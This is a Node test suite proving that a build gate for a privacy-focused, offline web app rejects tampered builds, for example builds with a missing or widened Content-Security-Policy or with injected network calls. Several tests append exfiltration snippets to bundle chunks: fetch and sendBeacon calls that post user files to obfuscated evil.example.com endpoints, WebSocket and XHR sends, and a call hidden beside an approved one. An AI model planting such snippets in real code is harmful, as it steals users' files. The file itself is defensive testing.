/*
 * The gate on the gate.
 *
 * scripts/check-local.mjs is what stands between a regression and a shipped
 * broken privacy promise. A green run of it means nothing unless it is known to
 * go RED for the things it claims to catch — this file is that proof. Every case
 * below takes a real dist/, breaks exactly one property, and asserts the check
 * fails with a message about that property.
 *
 * The reason this file exists at all: an audit found check-local.mjs passing a
 * build with NO Content-Security-Policy anywhere (the gate was counting a
 * <code>connect-src 'self'</code> sentence in the page copy), and passing a
 * chunk that exfiltrated to a runtime-concatenated URL. Both are cases below.
 *
 * Run: node --test scripts/check-local.test.mjs   (needs app/dist built)
 */
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { cp, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

const REPO = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const CHECKER = path.join(REPO, "scripts", "check-local.mjs");
const APPS = ["app", "app-img", "app-img2pdf", "app-scrub", "app-zip"];
const REFERENCE_DIST = path.join(REPO, "app", "dist");

function runChecker(distDirectory) {
  const result = spawnSync(process.execPath, [CHECKER, distDirectory], { encoding: "utf8" });
  return { code: result.status, out: `${result.stdout}${result.stderr}` };
}

/** Copies app/dist to a scratch directory, applies `mutate`, runs the checker. */
async function checkTamperedBuild(mutate) {
  const scratch = await mkdtemp(path.join(os.tmpdir(), "check-local-"));
  const dist = path.join(scratch, "dist");
  try {
    await cp(REFERENCE_DIST, dist, { recursive: true });
    const helpers = {
      dist,
      read: (relative) => readFile(path.join(dist, relative), "utf8"),
      write: (relative, contents) => writeFile(path.join(dist, relative), contents),
      async edit(relative, from, to) {
        const before = await this.read(relative);
        assert.ok(
          before.includes(from),
          `tamper setup is stale: ${relative} no longer contains ${JSON.stringify(from.slice(0, 60))}`,
        );
        await this.write(relative, before.replace(from, to));
      },
      /** Appends code to the bundled entry chunk, the way a compromised dependency would. */
      async appendToEntryChunk(code) {
        const assets = await readFile(path.join(dist, "sw.js"), "utf8");
        const entry = assets.match(/\/assets\/index-[\w-]+\.js/)?.[0];
        assert.ok(entry, "could not locate the entry chunk in sw.js");
        const relative = entry.slice(1);
        await this.write(relative, `${await this.read(relative)}\n${code}\n`);
      },
    };
    await mutate(helpers);
    return runChecker(dist);
  } finally {
    await rm(scratch, { recursive: true, force: true });
  }
}

/** Asserts the checker rejects the tampered build, and for the stated reason. */
async function assertRejects(mutate, expected) {
  const { code, out } = await checkTamperedBuild(mutate);
  assert.notEqual(code, 0, `check-local.mjs exited 0 on a build it must reject.\n${out}`);
  assert.match(out, expected, `check-local.mjs failed, but not for the expected reason.\n${out}`);
}

test("the reference build exists (build it before running these gates)", () => {
  assert.ok(
    existsSync(REFERENCE_DIST),
    "app/dist is missing — run `npm --prefix app run build` first",
  );
});

test("every shipped app passes the check as built", () => {
  for (const app of APPS) {
    const dist = path.join(REPO, app, "dist");
    if (!existsSync(dist)) continue;
    const { code, out } = runChecker(dist);
    assert.equal(code, 0, `${app}/dist failed the provable-local check:\n${out}`);
    assert.match(out, /Provable-local check passed/);
  }
});

// ---------------------------------------------------------------------------
// P1 — the CSP must come from where a browser reads it, not from page copy.
// ---------------------------------------------------------------------------

const CSP_HEADER_LINE = /\n\s*Content-Security-Policy:[^\n]*/;
// The built markup keeps the source formatting: attributes on their own lines.
const META_CSP_TAG = /<meta\b[^>]*http-equiv="Content-Security-Policy"[^>]*>/;

test("REGRESSION: a build with no CSP anywhere is rejected even though the page still says connect-src 'self'", async () => {
  await assertRejects(async (build) => {
    const headers = await build.read("_headers");
    await build.write("_headers", headers.replace(CSP_HEADER_LINE, ""));
    const html = await build.read("index.html");
    await build.write("index.html", html.replace(META_CSP_TAG, ""));
    // The trust card still contains "<code>connect-src 'self'</code>" — the exact
    // prose that used to satisfy the old gate. It must not help here.
    assert.match(await build.read("index.html"), /connect-src 'self'/);
  }, /_headers declares no Content-Security-Policy header/);
});

test("a missing CSP response header is rejected", async () => {
  await assertRejects(async (build) => {
    const headers = await build.read("_headers");
    await build.write("_headers", headers.replace(CSP_HEADER_LINE, ""));
  }, /_headers declares no Content-Security-Policy header/);
});

test("a missing meta CSP fallback is rejected", async () => {
  await assertRejects(async (build) => {
    const html = await build.read("index.html");
    await build.write("index.html", html.replace(META_CSP_TAG, ""));
  }, /no <meta http-equiv="Content-Security-Policy"> fallback/);
});

test("a CSP that only covers a narrow path, not /*, is rejected", async () => {
  await assertRejects(
    (build) => build.edit("_headers", "/*\n", "/index.html\n"),
    /no Content-Security-Policy on the catch-all/,
  );
});

test("connect-src * is rejected", async () => {
  await assertRejects(
    (build) => build.edit("_headers", "connect-src 'self'", "connect-src *"),
    /CSP connect-src must be exactly "'self'"/,
  );
});

test("a remote origin added to connect-src is rejected", async () => {
  await assertRejects(
    (build) => build.edit("_headers", "connect-src 'self'", "connect-src 'self' https://telemetry.example.com"),
    /CSP connect-src must be exactly "'self'"|names a remote source/,
  );
});

test("a dropped worker-src directive is rejected", async () => {
  await assertRejects(async (build) => {
    await build.edit("_headers", "worker-src 'self'; ", "");
    await build.edit("index.html", "worker-src 'self'; ", "");
  }, /CSP is missing the worker-src directive/);
});

test("worker-src widened to blob: is rejected", async () => {
  await assertRejects(async (build) => {
    await build.edit("_headers", "worker-src 'self'", "worker-src 'self' blob:");
    await build.edit("index.html", "worker-src 'self'", "worker-src 'self' blob:");
  }, /CSP worker-src must be exactly "'self'"/);
});

test("script-src 'unsafe-eval' is rejected", async () => {
  await assertRejects(async (build) => {
    await build.edit("_headers", "script-src 'self' 'wasm-unsafe-eval'", "script-src 'self' 'unsafe-eval'");
    await build.edit("index.html", "script-src 'self' 'wasm-unsafe-eval'", "script-src 'self' 'unsafe-eval'");
  }, /CSP script-src may not contain 'unsafe-eval'/);
});

test("a meta fallback that drifts from the served header is rejected", async () => {
  // The in-page receipt reads the meta tag, so a drifting fallback makes the
  // receipt describe a policy the browser is not enforcing.
  await assertRejects(
    (build) => build.edit("index.html", "script-src 'self' 'wasm-unsafe-eval'", "script-src 'self'"),
    /differs between the served header/,
  );
});

test("form-action opened up is rejected", async () => {
  await assertRejects(async (build) => {
    await build.edit("_headers", "form-action 'none'", "form-action *");
    await build.edit("index.html", "form-action 'none'", "form-action *");
  }, /CSP form-action must be exactly "'none'"/);
});

// ---------------------------------------------------------------------------
// P2 — network-capable APIs, not just literal URLs.
// ---------------------------------------------------------------------------

test("REGRESSION: a chunk that builds its exfiltration URL at runtime is rejected", async () => {
  await assertRejects(
    (build) =>
      build.appendToEntryChunk(
        'fetch(["ht","tps:","//ev","il.example",".com","/up"].join(""),{method:"POST",body:userFile});',
      ),
    /unreviewed network-capable call site "fetch\("/,
  );
});

test("navigator.sendBeacon with a base64-decoded endpoint is rejected", async () => {
  await assertRejects(
    (build) => build.appendToEntryChunk('navigator.sendBeacon(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGU="),userFile);'),
    /unreviewed network-capable call site "sendBeacon"/,
  );
});

test("a WebSocket is rejected", async () => {
  await assertRejects(
    (build) => build.appendToEntryChunk('const s=new WebSocket(host);s.send(userFile);'),
    /unreviewed network-capable call site "WebSocket"/,
  );
});

test("an EventSource is rejected", async () => {
  await assertRejects(
    (build) => build.appendToEntryChunk('new EventSource(endpoint);'),
    /unreviewed network-capable call site "EventSource"/,
  );
});

test("an XMLHttpRequest is rejected", async () => {
  await assertRejects(
    (build) => build.appendToEntryChunk('const x=new XMLHttpRequest();x.open("POST",u);x.send(userFile);'),
    /unreviewed network-capable call site "XMLHttpRequest"/,
  );
});

test("an RTCPeerConnection data channel is rejected", async () => {
  // WebRTC is not covered by connect-src at all, which is exactly why the
  // static gate has to name it.
  await assertRejects(
    (build) => build.appendToEntryChunk('const p=new RTCPeerConnection();p.createDataChannel("x");'),
    /unreviewed network-capable call site "RTCPeerConnection"/,
  );
});

test("a dynamic import of a computed specifier is rejected", async () => {
  await assertRejects(
    (build) => build.appendToEntryChunk('import(remoteModuleUrl).then((m)=>m.send(userFile));'),
    /unreviewed network-capable call site "import\("/,
  );
});

test("importScripts in the service worker is rejected", async () => {
  await assertRejects(
    async (build) => build.write("sw.js", `${await build.read("sw.js")}\nimportScripts(extra);\n`),
    /unreviewed network-capable call site "importScripts\("/,
  );
});

test("an added fetch inside the service worker is rejected", async () => {
  await assertRejects(
    async (build) =>
      build.write("sw.js", `${await build.read("sw.js")}\nfetch(collector,{method:"POST"});\n`),
    /unreviewed network-capable call site "fetch\("/,
  );
});

test("a fetch injected right beside an approved call site does not inherit its approval", async () => {
  // The reviewed-call-site allowlist matches spans, not neighbourhoods. Anything
  // else and an attacker just parks their call next to a blessed one.
  await assertRejects(async (build) => {
    const assets = await readFile(path.join(build.dist, "sw.js"), "utf8");
    const chunk = assets.match(/\/assets\/core\.worker-[\w-]+\.js/)?.[0].slice(1);
    assert.ok(chunk, "could not locate the worker chunk");
    const code = await build.read(chunk);
    const marker = "=fetch(";
    const at = code.indexOf(marker);
    assert.ok(at > 0, "the wasm-bindgen fetch call site moved; update this gate");
    await build.write(chunk, `${code.slice(0, at)}=fetch(evil)||fetch(${code.slice(at + marker.length)}`);
  }, /unreviewed network-capable call site "fetch\("/);
});

test("an inline script in the HTML is scanned too", async () => {
  await assertRejects(
    (build) =>
      build.edit("index.html", "</body>", '<script>navigator.sendBeacon(u,f);</script></body>'),
    /inline script.*unreviewed network-capable call site "sendBeacon"/s,
  );
});

test("a literal external URL anywhere in a shipped asset is still rejected", async () => {
  await assertRejects(
    (build) => build.appendToEntryChunk('const collector="https://evil.example.com/upload";'),
    /external URL is forbidden: https:\/\/evil\.example\.com/,
  );
});

test("script inside an SVG asset is rejected", async () => {
  await assertRejects(
    (build) => build.edit("icons/icon.svg", "<svg", '<svg onload="x"><script>fetch(u)</script'),
    /SVG assets must not contain <script>/,
  );
});

// ---------------------------------------------------------------------------
// Offline/asset invariants the check already carried — kept honest.
// ---------------------------------------------------------------------------

test("a missing service worker is rejected", async () => {
  await assertRejects(
    (build) => rm(path.join(build.dist, "sw.js")),
    /Offline service worker dist\/sw\.js is missing/,
  );
});

test("a service worker that stops precaching the WASM core is rejected", async () => {
  await assertRejects(
    async (build) =>
      build.write("sw.js", (await build.read("sw.js")).replace(/"\/assets\/[\w-]+\.wasm",?\n/, "")),
    /does not precache WASM asset/,
  );
});
